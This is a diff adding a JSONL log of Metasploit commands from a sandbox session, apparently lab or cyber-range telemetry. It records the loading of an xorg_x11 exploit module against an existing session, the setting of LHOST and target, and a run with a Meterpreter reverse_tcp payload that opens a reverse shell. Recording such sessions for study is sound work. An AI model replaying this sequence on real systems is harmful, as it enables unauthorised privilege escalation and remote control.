@@ -1,0 +1,13 @@
+{"sandbox_id": "396", "timestamp_str": "2019-08-14T16:27:44.876095Z", "cmd_type": "msf-command", "cmd": "sessions -i 2"}
+{"sandbox_id": "396", "timestamp_str": "2019-08-14T16:27:53.252177Z", "cmd_type": "msf-command", "cmd": "search xorg_x11"}
+{"sandbox_id": "396", "timestamp_str": "2019-08-14T16:27:57.119698Z", "cmd_type": "msf-command", "cmd": "use 0"}
+{"sandbox_id": "396", "timestamp_str": "2019-08-14T16:28:00.676929Z", "cmd_type": "msf-command", "cmd": "show options "}
+{"sandbox_id": "396", "timestamp_str": "2019-08-14T16:28:11.653901Z", "cmd_type": "msf-command", "cmd": "set SESSION 1"}
+{"sandbox_id": "396", "timestamp_str": "2019-08-14T16:29:08.085170Z", "cmd_type": "msf-command", "cmd": "set LHOST 10.0.135.83"}
+{"sandbox_id": "396", "timestamp_str": "2019-08-14T16:29:13.122140Z", "cmd_type": "msf-command", "cmd": "show options "}
+{"sandbox_id": "396", "timestamp_str": "2019-08-14T16:29:18.910205Z", "cmd_type": "msf-command", "cmd": "show targets "}
+{"sandbox_id": "396", "timestamp_str": "2019-08-14T16:29:37.576544Z", "cmd_type": "msf-command", "cmd": "set TARGET 1"}
+{"sandbox_id": "396", "timestamp_str": "2019-08-14T16:29:44.475658Z", "cmd_type": "msf-command", "cmd": "run"}
+{"sandbox_id": "396", "timestamp_str": "2019-08-14T16:30:20.839567Z", "cmd_type": "msf-command", "cmd": "set payload linux/x64/meterpreter/reverse_tcp "}
+{"sandbox_id": "396", "timestamp_str": "2019-08-14T16:30:25.301158Z", "cmd_type": "msf-command", "cmd": "show options "}
+{"sandbox_id": "396", "timestamp_str": "2019-08-14T16:30:30.774518Z", "cmd_type": "msf-command", "cmd": "run"}
